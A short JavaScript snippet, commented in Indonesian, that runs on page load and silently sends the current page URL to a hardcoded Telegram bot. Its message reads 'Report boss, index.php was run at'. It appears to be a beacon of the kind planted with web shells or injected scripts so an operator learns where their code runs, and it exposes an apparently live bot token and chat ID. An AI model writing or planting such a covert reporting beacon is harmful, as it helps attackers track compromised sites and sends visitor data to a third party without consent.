(function() {
  const url = window.location.href;
  const message = encodeURIComponent(`Lapor bos, index.php dijalankan di: ${url}`);
  const telegramToken = '8471738613:AAHY5IHGgp42sB8CoTJTC7iggOQiHRouqV4'; // Ganti dengan token kamu
  const chatId = '6813445148'; // Ganti dengan chat ID kamu

  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${message}`)
    .then(response => console.log("Laporan dikirim ke Telegram"))
    .catch(error => console.error("Gagal mengirim ke Telegram:", error));
})();
